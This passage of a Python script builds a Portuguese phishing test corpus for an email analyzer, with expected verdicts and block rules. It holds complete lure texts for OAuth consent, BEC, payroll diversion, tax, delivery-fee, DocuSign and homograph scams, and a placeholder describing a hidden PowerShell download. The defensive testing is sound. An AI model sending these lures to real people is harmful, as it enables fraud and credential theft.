    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='alta', mitre=['T1566.001', 'T1027.006']),
    sinais_obrigatorios=['anexo-perigoso', 'svg-script'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 6}),
    ioc_escondido='voicemail-player.example',
)

# 06 ---------------------------------------------------------------- consent phishing (OAuth)
dom = 'assinafacil-app.example'
ip = '198.51.100.61'
data = 'Wed, 11 Nov 2026 09:20:17 +0000'
rec, rec_ext = received_exo(f'mta.{dom}', ip, data)
alvo = ('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8f3a2c1e-5b7d-4e9a-a1c3-2d4f6b8e0a17'
        '&response_type=code&redirect_uri=https%3A%2F%2Fassinafacil-app.example%2Foauth%2Fcallback&response_mode=query'
        '&scope=offline_access%20User.Read%20Mail.ReadWrite%20Mail.Send%20Files.ReadWrite.All&prompt=consent&state=7741')
htm = f'''<html><body style="font-family:Segoe UI,Arial;font-size:14px;color:#222">
<div style="max-width:560px;border:1px solid #ddd;padding:24px">
<h2 style="color:#2b579a;margin-top:0">AssinaFácil</h2>
<p>Olá, <b>Maria Souza</b>!</p>
<p>O documento <b>"Aditivo Contratual - Reajuste 2027.pdf"</b> foi enviado para sua assinatura por
<b>financeiro@grupo-alvorada.example</b>.</p>
<p>Para sua segurança, entre com a sua conta corporativa Microsoft para visualizar e assinar.</p>
<p><a href="{alvo}" style="background:#2b579a;color:#fff;padding:10px 22px;text-decoration:none;border-radius:4px">Revisar e assinar</a></p>
<p style="font-size:12px;color:#777">Este link expira em 48 horas.</p></div></body></html>'''
txt = ('AssinaFácil\n\nOlá, Maria Souza!\n\nO documento "Aditivo Contratual - Reajuste 2027.pdf" foi enviado para sua '
       'assinatura por financeiro@grupo-alvorada.example.\n\nPara sua segurança, entre com a sua conta corporativa Microsoft '
       f'para visualizar e assinar.\n\nRevisar e assinar: {alvo}\n\nEste link expira em 48 horas.\n')
corpo = alternativo(txt, htm, '=_a3f19c8e7b2d4c5f9e1a0b6d8c2e4f71')
caso(
    id='06-oauth-consent-phishing',
    titulo='Consent phishing: link VERDADEIRO da Microsoft pedindo permissão para um app malicioso ler e enviar e-mails',
    tecnica=('OAuth Consent Phishing: a página de login é a real (login.microsoftonline.com), mas o app pede '
             'offline_access + Mail.ReadWrite + Mail.Send + Files.ReadWrite.All e devolve o código para um site do atacante '
             '(redirect_uri). Trocar a senha NÃO resolve: o token do app continua valendo até a permissão ser revogada.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('AssinaFácil', f'notificacoes@{dom}')),
               ('To', f'maria.souza@{ORG}'), ('Subject', assunto('Documento aguardando sua assinatura: Aditivo Contratual - Reajuste 2027')),
               ('Date', data), ('Message-ID', f'<0100019a3f19c8e7-assina-7741@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Cliquei para assinar o documento, entrei com a minha conta e apareceu uma tela pedindo permissões, cliquei em Aceitar. Depois não apareceu documento nenhum.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['OAuth', 'Consent Phishing'], delivery_channel='Email',
                  target='Finance', gravidade='critica', mitre=['T1566.002', 'T1528']),
    sinais_obrigatorios=['oauth-consentimento'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=['login.microsoftonline.com', 'microsoftonline.com']),
    reputacao=dict(rdap={dom: 8}),
)

# 07 ---------------------------------------------------------------- SharePoint real de um tenant comprometido
ip = '40.107.215.98'
data = 'Wed, 11 Nov 2026 14:05:39 +0000'
rec, rec_ext = received_exo('SEYPR02CU001.outbound.protection.outlook.com', ip, data, frontend='CP2PEPF0000012B')
alvo = ('https://construtoranogueira-my.sharepoint.com/:b:/g/personal/roberto_construtoranogueira_onmicrosoft_com/'
        'EaR7x2lQm1hBn4kP0sV9t3cB8wYj2KqX5u7Zr1Df6gHnLw?e=Qm3kVz')
htm = f'''<html><body style="font-family:Segoe UI,Arial;font-size:14px">
<table width="520" cellpadding="0" cellspacing="0"><tr><td style="padding:20px">
<p style="font-size:21px">Roberto Nogueira compartilhou um arquivo com você</p>
<p style="color:#605e5c">Segue o comprovante de pagamento da medição de outubro. Confirme o recebimento, por favor.</p>
<table style="border:1px solid #edebe9;padding:12px;width:100%"><tr><td>
<b>Comprovante_Pagamento_Medicao_Out-2026.pdf</b></td></tr></table><br>
<a href="{alvo}" style="background:#0078d4;color:#fff;padding:8px 20px;text-decoration:none">Abrir</a>
<p style="font-size:12px;color:#605e5c;padding-top:20px">Este link só funciona para os destinatários diretos desta mensagem.</p>
<p style="font-size:11px;color:#a19f9d">Microsoft respeita a sua privacidade. Para saber mais, leia nossa Política de Privacidade.<br>
Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p></td></tr></table></body></html>'''
txt = ('Roberto Nogueira compartilhou um arquivo com você\n\nSegue o comprovante de pagamento da medição de outubro. '
       'Confirme o recebimento, por favor.\n\nComprovante_Pagamento_Medicao_Out-2026.pdf\n\n'
       f'Abrir: {alvo}\n\nEste link só funciona para os destinatários diretos desta mensagem.\n')
corpo = alternativo(txt, htm, '_000_SEYPR02MB6211E0F7_')
caso(
    id='07-sharepoint-tenant-comprometido',
    titulo='Abuso do SharePoint: compartilhamento verdadeiro vindo de um cliente invadido (golpe em 2 etapas)',
    tecnica=('SharePoint/OneDrive Abuse: o e-mail é uma notificação legítima da Microsoft (tudo passa), o link é '
             'sharepoint.com de verdade. O PDF hospedado lá tem um botão "Acessar documento" que leva à página falsa. '
             'Pelo e-mail, quase nada denuncia: o relato do usuário é a melhor evidência.'),
    cabecalhos=rec + [*autenticacao_exo(ip, 'sharepointonline.com', 'sharepointonline.com', 'pass', 'pass', 'pass',
                                        dkim_d='sharepointonline.com'), rec_ext,
               dkim_assinatura('sharepointonline.com', 'selector1-sharepointonline-com'),
               ('From', nome_codificado('Roberto Nogueira (via SharePoint Online)', 'no-reply@sharepointonline.com')),
               ('Reply-To', 'roberto@construtoranogueira.example'),
               ('To', f'maria.souza@{ORG}'),
               ('Subject', assunto('Roberto Nogueira compartilhou "Comprovante_Pagamento_Medicao_Out-2026.pdf" com você')),
               ('Date', data), ('Message-ID', '<5f0c2a17-9be4-4d71-8c3e-1a2b3c4d5e6f@SEYPR02MB6211.apcprd02.prod.outlook.com>'),
               *antispam_exo()],
    corpo=corpo,
    relato=('Abri o link do SharePoint, apareceu um PDF com um botão "Acessar documento" e ele pediu a minha senha da '
            'Microsoft numa página de outro endereço. Não digitei. A construtora Nogueira é nossa cliente, mas eu não esperava esse comprovante.'),
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='Finance', gravidade='alta', mitre=['T1566.002', 'T1199']),
    sinais_obrigatorios=['relato-pagina-falsa'],
    sinais_proibidos=['marca'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['sharepoint.com', 'sharepointonline.com', 'construtoranogueira-my.sharepoint.com']),
    reputacao=dict(),
    lacuna=('Pelo e-mail, nada denuncia (SharePoint verdadeiro de um cliente invadido): só o relato ("pediu a senha numa '
            'página de outro endereço") levanta a suspeita, e sozinho ele leva a INCONCLUSIVO (vai ao analista), não a phishing. '
            'A página falsa está atrás do PDF, que o analisador não abre. Atenção: o domínio do cliente invadido (Reply-To) '
            'entra nos IOCs; o analista não deve bloqueá-lo (cortaria um cliente).'),
)

# 08 ---------------------------------------------------------------- BEC: diretora pede cartões-presente
ip = '209.85.220.41'
data = 'Thu, 12 Nov 2026 10:48:02 +0000'
rec, rec_ext = received_exo('mail-sor-f41.google.com', ip, data)
txt = ('Lucas, está disponível?\n\nEstou em uma reunião com o conselho e não consigo atender ligação. Preciso de um favor '
       'urgente e discreto: comprar 6 cartões-presente da Google Play de R$ 500 para a premiação surpresa da equipe '
       'comercial. Não comente com ninguém por enquanto, é surpresa.\n\nMe responda por aqui que eu passo os detalhes. '
       'Depois o financeiro te reembolsa.\n\nCarla Mendes\nDiretora Executiva\n\nEnviado do meu iPhone\n')
corpo = texto(txt)
caso(
    id='08-bec-diretora-cartoes-presente',
    titulo='BEC (fraude do "chefe"): diretora pede cartões-presente por Gmail',
    tecnica=('Business Email Compromise: nome de uma diretora real com um Gmail qualquer, urgência, sigilo e pedido de '
             'compra de cartões-presente. Sem link nem anexo: filtros técnicos não pegam.'),
    cabecalhos=rec + [*autenticacao_exo(ip, 'gmail.com', 'gmail.com', 'pass', 'pass', 'pass', dkim_d='gmail.com'), rec_ext,
               dkim_assinatura('gmail.com', '20230601'),
               ('From', nome_codificado('Carla Mendes', 'carla.mendes.diretoria@gmail.com')),
               ('To', f'lucas.ferreira@{ORG}'), ('Subject', 'Disponivel?'),
               ('Date', data), ('Message-ID', '<CAJx7mB0Q4hR2pV9e1kY_3tF8wN6zLs5aD0cU2gXo7iP@mail.gmail.com>'),
               ('X-Mailer', 'iPhone Mail (21H16)'), *antispam_exo()],
    corpo=corpo,
    relato='Recebi esse pedido em nome da diretora Carla, mas pelo Gmail. Não respondi.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='phishing', phishing_type=['BEC'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566', 'T1656']),
    sinais_obrigatorios=['bec', 'bec-nome-interno', 'bec-executivo-webmail'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['gmail.com', ORG]),
    reputacao=dict(),
)

# 09 ---------------------------------------------------------------- BEC: fornecedor sósia troca dados bancários
dom_real = 'graficapaulista.example'
dom = 'graficapaullsta.example'
ip = '203.0.113.201'
data = 'Thu, 12 Nov 2026 16:22:40 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
txt = ('Bom dia, Ana,\n\nConforme alinhado, segue em anexo a carta com os novos dados bancários da Gráfica Paulista. '
       'Por uma mudança de conta bancária da empresa (migração de banco), pedimos que o pagamento do pedido 4471 '
       '(R$ 38.250,00, vencimento 16/11) seja feito já na conta nova.\n\nA conta antiga será encerrada nesta semana, por '
       'isso pedimos a gentileza de atualizar o cadastro com urgência.\n\nAtenciosamente,\nJuliana Prado\nFinanceiro | '
       'Gráfica Paulista\n(11) 0093-4400\n\n'
       f'De: Ana Ribeiro <ana.ribeiro@{ORG}>\nEnviado: segunda-feira, 9 de novembro de 2026 14:10\n'
       f'Para: Juliana Prado <juliana.prado@{dom_real}>\nAssunto: RE: Pedido 4471 - Faturamento\n\n'
       'Juliana, recebemos a NF do pedido 4471. O pagamento está programado para o dia 16/11.\n\nAna\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('_004_GV1P195MB1812D0A9_')
corpo.attach(texto(txt))
corpo.attach(anexo(pdf_minimo(['GRAFICA PAULISTA LTDA', 'Carta de alteracao de dados bancarios',
                               'Banco: 000  Agencia: 0000  Conta: 0000000-0', 'Favorecido: Grafica Paulista Ltda',
                               'Documento de teste do corpus do analisador-phishing-glpi']),
                   'application/pdf', 'Carta_Alteracao_Dados_Bancarios.pdf'))
caso(
    id='09-bec-fornecedor-dados-bancarios',
    titulo='BEC de fornecedor: domínio sósia (i -> l) entra na conversa e troca a conta de pagamento',
    tecnica=('Vendor Email Compromise / thread hijacking: o golpista copiou uma conversa real (provavelmente de uma caixa '
             'invadida do fornecedor) e responde de um domínio quase igual, com carta em PDF e novos dados bancários.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Juliana Prado', f'juliana.prado@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', 'RE: Pedido 4471 - Faturamento'),
               ('In-Reply-To', f'<GV1P195MB18129A2B@GV1P195MB1812.EURP195.PROD.OUTLOOK.COM>'),
               ('References', f'<GV1P195MB18129A2B@GV1P195MB1812.EURP195.PROD.OUTLOOK.COM>'),
               ('Date', data), ('Message-ID', f'<GV1P195MB1812D0A9F3@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='A Gráfica Paulista pediu para trocar a conta do pagamento do pedido 4471. Ainda não paguei. Pode verificar?',
    requerente='ana.ribeiro (Compras)',
    esperado=dict(classificacao='phishing', phishing_type=['BEC'], delivery_channel='Email',
                  target='Finance', gravidade='alta', mitre=['T1566.001', 'T1656', 'T1534']),
    sinais_obrigatorios=['bec', 'dominio-novo', 'dominio-sosia-conversa'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=[dom_real, ORG]),
    reputacao=dict(rdap={dom: 5}),
)

# 10 ---------------------------------------------------------------- BEC: desvio de salário (RH)
ip = '40.92.42.17'
data = 'Fri, 13 Nov 2026 11:09:55 +0000'
rec, rec_ext = received_exo('NAM12-DM6-obe.outbound.protection.outlook.com', ip, data, frontend='CP2PEPF0000012C')
txt = ('Olá, RH, bom dia.\n\nTroquei de banco e gostaria de atualizar a conta onde recebo o meu salário a partir da folha '
       'de novembro. Estou mandando do meu e-mail pessoal porque estou de home office e sem acesso à VPN.\n\n'
       'Novos dados:\nBanco: 000\nAgência: 0000\nConta: 0000000-0\n\nConsegue confirmar quando estiver '
       'feito? Obrigado!\n\nJoão Lima\n')
corpo = texto(txt)
caso(
    id='10-bec-desvio-de-salario',
    titulo='Desvio de salário: "funcionário" pede ao RH troca da conta salário pelo e-mail pessoal',
    tecnica=('Payroll Diversion (BEC contra o RH): o golpista usa o nome de um funcionário real num Outlook.com e pede a '
             'troca da conta de depósito. Nenhum link, nenhum anexo, autenticação passa.'),
    cabecalhos=rec + [*autenticacao_exo(ip, 'outlook.com', 'outlook.com', 'pass', 'pass', 'pass', dkim_d='outlook.com'), rec_ext,
               dkim_assinatura('outlook.com', 'selector1'),
               ('From', nome_codificado('João Lima', 'joao.lima.cs@outlook.com')),
               ('To', f'rh@{ORG}'), ('Subject', assunto('Atualização de conta salário')),
               ('Date', data), ('Message-ID', '<CH3PR19MB7412F0A1B2C3D4E5@CH3PR19MB7412.namprd19.prod.outlook.com>'),
               *antispam_exo()],
    corpo=corpo,
    relato='Chegou no e-mail do RH um pedido do João Lima para trocar a conta salário, mas veio de um Outlook pessoal. Não alteramos nada ainda.',
    requerente='joao.lima (RH)',
    esperado=dict(classificacao='phishing', phishing_type=['BEC'], delivery_channel='Email',
                  target='HR', gravidade='media', mitre=['T1566', 'T1656']),
    sinais_obrigatorios=['bec-conta-salario', 'bec-pretexto'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['outlook.com', ORG]),
    reputacao=dict(),
    lacuna=('As regras pegam a troca de conta salário e a desculpa do e-mail pessoal, mas sem saber que João Lima é '
            'funcionário a nota fica em INCONCLUSIVO (vai ao analista). Resolve quando a lista de pessoas da organização '
            'vier do AD/GLPI (hoje "nomesInternos" tem só as pessoas-chave).'),
)

# 11 ---------------------------------------------------------------- Receita Federal / CPF (encurtador)
dom = 'receita-regularize.example'
ip = '198.51.100.140'
data = 'Fri, 13 Nov 2026 13:30:00 +0000'
rec, rec_ext = received_exo(f'o1.ptr4471.{dom}', ip, data)
alvo = 'https://bit.ly/4cPfRgL2026'
htm = f'''<html><body style="font-family:Arial;font-size:14px">
<div style="background:#1351b4;color:#fff;padding:14px"><b>gov.br</b> &nbsp; Receita Federal</div>
<div style="padding:20px">
<p><b>Notificação de pendência - CPF ***.482.917-**</b></p>
<p>Identificamos divergências na sua Declaração de Imposto de Renda 2026 (ano-calendário 2025). O seu CPF está sujeito
a ficar <b>suspenso</b> e a cobrança de multa de 20% sobre o imposto devido.</p>
<p>Regularize a situação em até <b>48 horas</b> e evite o bloqueio do CPF e a inscrição em dívida ativa.</p>
<p><a href="{alvo}" style="background:#168821;color:#fff;padding:10px 20px;text-decoration:none">Consultar pendência e emitir DARF</a></p>
<p style="font-size:11px;color:#555">Ministério da Fazenda - Receita Federal do Brasil</p></div></body></html>'''
txt = ('gov.br Receita Federal\n\nNotificação de pendência - CPF ***.482.917-**\n\nIdentificamos divergências na sua '
       'Declaração de Imposto de Renda 2026. O seu CPF está sujeito a ficar suspenso e a cobrança de multa de 20%.\n\n'
       f'Regularize a situação em até 48 horas e evite o bloqueio do CPF.\n\nConsultar pendência e emitir DARF: {alvo}\n')
corpo = alternativo(txt, htm, '----==_mimepart_6734a1f0c2b4e_3f1a2b3c4d')
caso(
    id='11-receita-federal-cpf',
    titulo='Receita Federal: "pendência no CPF" com link encurtado e prazo de 48 horas',
    tecnica='Golpe de órgão público (gov.br) com encurtador para esconder o destino e emissão de DARF falso (pagamento).',
    cabecalhos=rec + [*autenticacao_exo(ip, f'bounces.{dom}', dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('Return-Path', f'<bounces+4471-a1b2@bounces.{dom}>'),
               ('From', nome_codificado('Receita Federal do Brasil', f'notificacao@{dom}')),
               ('To', f'pedro.alves@{ORG}'), ('Subject', assunto('Notificação de pendência - CPF ***.482.917-**')),
               ('Date', data), ('Message-ID', f'<6734a1f0c2b4e.3f1a2b3c4d@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou no meu e-mail do trabalho uma pendência da Receita sobre o meu CPF. Não cliquei.',
    requerente='pedro.alves (TI)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.002', 'T1656']),
    sinais_obrigatorios=['marca', 'encurtador', 'urgencia', 'imitacao-dominio-novo'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=['bit.ly', 'gov.br']),
    reputacao=dict(rdap={dom: 9}),
)

# 12 ---------------------------------------------------------------- Correios: taxa de importação por PIX (usuário pagou)
dom = 'correios-rastreio-br.example'
ip = '203.0.113.19'
data = 'Fri, 13 Nov 2026 17:55:21 +0000'
rec, rec_ext = received_exo(f'srv1.{dom}', ip, data)
alvo = f'https://{dom}/rastreio/LB729384615BR/pagamento'
htm = f'''<html><body style="font-family:Arial;font-size:14px">
<div style="background:#ffcc00;padding:12px"><b style="color:#00416b">Correios</b></div>
<div style="padding:18px"><p>Olá,</p>
<p>Sua encomenda <b>LB729384615BR</b> está retida na unidade de fiscalização aduaneira de Curitiba/PR aguardando o
pagamento da taxa de importação de <b>R$ 47,90</b>.</p>
<p>Prazo final para pagamento: <b>14/11/2026</b>. Após essa data o objeto será devolvido ao remetente.</p>
<p><a href="{alvo}">Pagar com PIX e liberar entrega</a></p>
<p style="font-size:11px">Empresa Brasileira de Correios e Telégrafos</p></div></body></html>'''
txt = ('Correios\n\nOlá,\n\nSua encomenda LB729384615BR está retida na unidade de fiscalização aduaneira aguardando o '
       'pagamento da taxa de importação de R$ 47,90.\n\nPrazo final para pagamento: 14/11/2026.\n\n'
       f'Pagar com PIX e liberar entrega: {alvo}\n')
corpo = alternativo(txt, htm, '=_correios_8f2a91c3')
caso(
    id='12-correios-taxa-pix',
    titulo='Correios: "taxa de importação" paga por PIX (a usuária pagou)',
    tecnica='Golpe de entrega/taxa: página falsa gera um PIX. Prejuízo financeiro direto; MED do PIX é a resposta.',
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'fail', 'none', 'fail'), rec_ext,
               ('From', nome_codificado('Correios', f'rastreamento@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('Encomenda LB729384615BR retida - taxa pendente')),
               ('Date', data), ('Message-ID', f'<20261113175521.8f2a91c3@{dom}>'), *antispam_exo(scl=5)],
    corpo=corpo,
    relato='Eu estava esperando uma encomenda e paguei a taxa de R$ 47,90 pelo PIX. Depois vi que o endereço não era dos Correios.',
    requerente='ana.ribeiro (Compras)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='critica', mitre=['T1566.002', 'T1656']),
    sinais_obrigatorios=['marca', 'spf', 'dmarc', 'pagamento'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=['correios.com.br']),
    reputacao=dict(rdap={dom: 3}, urlhaus={f'{dom}': True}),
)

# 13 ---------------------------------------------------------------- DocuSign falso com página no IPFS
dom = 'docsign-envelopes.example'
ip = '192.0.2.150'
data = 'Mon, 16 Nov 2026 08:12:09 +0000'
rec, rec_ext = received_exo(f'mx2.{dom}', ip, data)
alvo = (f'https://ipfs.io/ipfs/bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi/index.html'
        f'#carla.mendes@{ORG}')
htm = f'''<html><body style="font-family:Helvetica,Arial;background:#f4f4f4">
<table align="center" width="560" style="background:#fff;padding:24px"><tr><td>
<p style="font-size:24px;color:#333"><b>DocuSign</b></p>
<div style="background:#1e4ca1;color:#fff;padding:24px;text-align:center">
<p style="font-size:16px">Recursos Humanos enviou um documento para você revisar e assinar.</p>
<a href="{alvo}" style="background:#ffc423;color:#333;padding:10px 24px;text-decoration:none;font-weight:bold">REVISAR DOCUMENTO</a></div>
<p>Carla Mendes,</p><p>Por favor, revise e assine: <b>Politica_Bonificacao_Diretoria_2027.pdf</b></p>
<p style="font-size:11px;color:#666">Não compartilhe este e-mail. Este e-mail contém um link seguro para o DocuSign.</p>
</td></tr></table></body></html>'''
txt = ('DocuSign\n\nRecursos Humanos enviou um documento para você revisar e assinar.\n\n'
       f'REVISAR DOCUMENTO: {alvo}\n\nCarla Mendes,\nPor favor, revise e assine: Politica_Bonificacao_Diretoria_2027.pdf\n')
corpo = alternativo(txt, htm, '----=_Part_1199_88124.1763280729')
caso(
    id='13-docusign-falso-ipfs',
    titulo='DocuSign falso para a diretoria, com página hospedada no IPFS',
    tecnica=('Isca de assinatura (DocuSign) com página de login em IPFS (gateway público): difícil de derrubar e com o '
             'e-mail da vítima no # da URL para preencher o login.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
               ('From', nome_codificado('Recursos Humanos via DocuSign', f'dse@{dom}')),
               ('To', f'carla.mendes@{ORG}'), ('Subject', assunto('Complete com DocuSign: Politica_Bonificacao_Diretoria_2027.pdf')),
               ('Date', data), ('Message-ID', f'<1199.88124.1763280729@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='DocuSign do RH sobre bonificação da diretoria, mas o RH disse que não mandou nada. Não abri.',
    requerente='carla.mendes (Diretoria)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='Executive', gravidade='media', mitre=['T1566.002']),
    sinais_obrigatorios=['marca', 'hospedagem', 'imitacao-dominio-novo', 'compartilhamento-falso'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=['ipfs.io', 'docusign.com', 'docusign.net']),
    reputacao=dict(rdap={dom: 15}),
)

# 14 ---------------------------------------------------------------- homógrafo (IDN / punycode)
dom = 'xn--mcrosoft-login-59l.example'   # "mіcrosoft-login" com "і" cirílico
ip = '203.0.113.66'
data = 'Mon, 16 Nov 2026 12:40:31 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
alvo = f'https://account.{dom}/security/verify?ref=sec-alert-55120'
htm = f'''<html><body style="font-family:Segoe UI,Arial;font-size:14px">
<p style="font-size:20px">Atividade de entrada incomum</p>
<p>Detectamos uma entrada incomum na conta <b>pedro.alves@{ORG}</b>.</p>
<p>País/região: Rússia<br>Endereço IP: 91.xxx.xxx.12<br>Data: 16/11/2026 09:31 (BRT)</p>
<p>Se não foi você, verifique a sua conta para protegê-la:</p>
<p><a href="{alvo}" style="background:#0067b8;color:#fff;padding:8px 16px;text-decoration:none">Verificar atividade</a></p>
<p>Obrigado,<br>Equipe de contas da Microsoft</p></body></html>'''
txt = (f'Atividade de entrada incomum\n\nDetectamos uma entrada incomum na conta pedro.alves@{ORG}.\n\nPaís/região: Rússia\n'
       f'Se não foi você, verifique a sua conta: {alvo}\n\nEquipe de contas da Microsoft\n')
corpo = alternativo(txt, htm, '_000_IDN55120_')
caso(
    id='14-homografo-idn',
    titulo='Homógrafo: domínio com letra cirílica que se lê "microsoft-login"',
    tecnica='IDN Homograph: "і" cirílico no lugar do "i" latino. Na tela parece mіcrosoft-login; na rede é xn--...',
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Microsoft account team', f'account-security-noreply@{dom}')),
               ('To', f'pedro.alves@{ORG}'), ('Subject', assunto('Atividade de entrada incomum na conta Microsoft')),
               ('Date', data), ('Message-ID', f'<sec-alert-55120@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Recebi alerta de login da Rússia. O endereço parece da Microsoft, mas achei a letra estranha. Não cliquei.',
    requerente='pedro.alves (TI)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.002', 'T1583.001']),
    sinais_obrigatorios=['punycode-remetente', 'url-punycode', 'marca', 'imitacao-dominio-novo'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=['microsoft.com', 'live.com']),
    reputacao=dict(rdap={dom: 2}),
)

# 15 ---------------------------------------------------------------- malware: zip com .lnk (comprovante PIX)
dom = 'transferencias-pix.example'
ip = '198.51.100.9'
data = 'Tue, 17 Nov 2026 09:03:47 +0000'
rec, rec_ext = received_exo(f'smtp.{dom}', ip, data)
lnk_falso = ('[Atalho de teste do corpus: num ataque real este .lnk executaria '
             'powershell -w hidden -ep bypass para baixar o malware]\r\n').encode('utf-8')
z = zip_fixo([('Comprovante_PIX_17-11-2026.pdf.lnk', lnk_falso), ('LEIA-ME.txt', LEIA_ME)])
txt = ('Boa tarde,\n\nSegue o comprovante do PIX de R$ 12.480,00 referente à quitação da nota. O arquivo está compactado '
       'por segurança.\n\nSenha: não precisa.\n\nQualquer divergência me avise.\n\nRafael\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_30044_872110.1763370227')
corpo.attach(texto(txt))
corpo.attach(anexo(z, 'application/zip', 'Comprovante_PIX_17-11-2026.zip'))
caso(
    id='15-malware-zip-lnk',
    titulo='Malware: "comprovante de PIX" em .zip com atalho .pdf.lnk (padrão dos trojans bancários)',
    tecnica=('Entrega de malware: o .zip esconde um atalho (.lnk) com ícone de PDF que roda PowerShell. Padrão comum de '
             'trojans bancários brasileiros. O e-mail em si só mostra um .zip.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
               ('From', nome_codificado('Rafael Andrade', f'rafael.andrade@{dom}')),
               ('To', f'maria.souza@{ORG}'), ('Subject', assunto('Comprovante PIX - quitação')),
               ('Date', data), ('Message-ID', f'<30044.872110.1763370227@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Recebi um comprovante de PIX de alguém que não conheço. Baixei e abri o zip, tinha um PDF que não abriu nada.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['Malware Delivery'], delivery_channel='Email',
                  target='Finance', gravidade='critica', mitre=['T1566.001', 'T1204.002', 'T1059.001']),
    sinais_obrigatorios=['anexo-compactado', 'pagamento', 'zip-conteudo-perigoso'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 7}),
)

# 16 ---------------------------------------------------------------- callback phishing (fatura verdadeira do PayPal)
ip = '173.0.84.226'
data = 'Tue, 17 Nov 2026 14:18:30 +0000'
rec, rec_ext = received_exo('mx0.slc.paypal.com', ip, data)
htm = '''<html><body style="font-family:Helvetica,Arial;font-size:14px;color:#2c2e2f">
<p><b>PayPal</b></p>
<p>Prime Software Solutions enviou uma fatura no valor de <b>R$ 1.899,00</b></p>
<table style="border:1px solid #ddd;padding:12px"><tr><td>Fatura nº: INV2-7K4D-QW2N-88RT-2LZM<br>
Vencimento: na data do recebimento</td></tr>
<tr><td style="padding-top:10px"><b>Observação do vendedor:</b><br>
Sua assinatura anual do Norton 360 Total Protection foi renovada automaticamente. Se você não reconhece esta
cobrança, ligue IMEDIATAMENTE para o nosso suporte de cancelamento: <b>0800 000 4417</b> (24h). O valor será debitado em 24 horas.</td></tr></table>
<p><a href="https://www.paypal.com/invoice/p/#INV2-7K4D-QW2N-88RT-2LZM">Ver e pagar a fatura</a></p>
<p style="font-size:11px">PayPal Pte. Ltd.</p></body></html>'''
txt = ('PayPal\n\nPrime Software Solutions enviou uma fatura no valor de R$ 1.899,00\n\nFatura nº: INV2-7K4D-QW2N-88RT-2LZM\n\n'
       'Observação do vendedor:\nSua assinatura anual do Norton 360 Total Protection foi renovada automaticamente. Se você '
       'não reconhece esta cobrança, ligue IMEDIATAMENTE para o nosso suporte de cancelamento: 0800 000 4417 (24h). '
       'O valor será debitado em 24 horas.\n\nVer e pagar a fatura: https://www.paypal.com/invoice/p/#INV2-7K4D-QW2N-88RT-2LZM\n')
corpo = alternativo(txt, htm, '----=_Part_paypal_inv_7K4D')
caso(
    id='16-callback-fatura-paypal',
    titulo='Callback phishing (TOAD): fatura VERDADEIRA do PayPal com "ligue para cancelar"',
    tecnica=('Telephone-Oriented Attack Delivery: o golpista cria uma fatura real no PayPal (tudo legítimo e autenticado) '
             'e escreve na observação um telefone de "cancelamento". Na ligação, pede acesso remoto (AnyDesk) ou dados '
             'bancários. Vishing iniciado por e-mail.'),
    cabecalhos=rec + [*autenticacao_exo(ip, 'paypal.com', 'paypal.com', 'pass', 'pass', 'pass', dkim_d='paypal.com'), rec_ext,
               dkim_assinatura('paypal.com', 'pp-dkim1'),
               ('From', nome_codificado('service@paypal.com', 'service@paypal.com')),
               ('To', f'lucas.ferreira@{ORG}'),
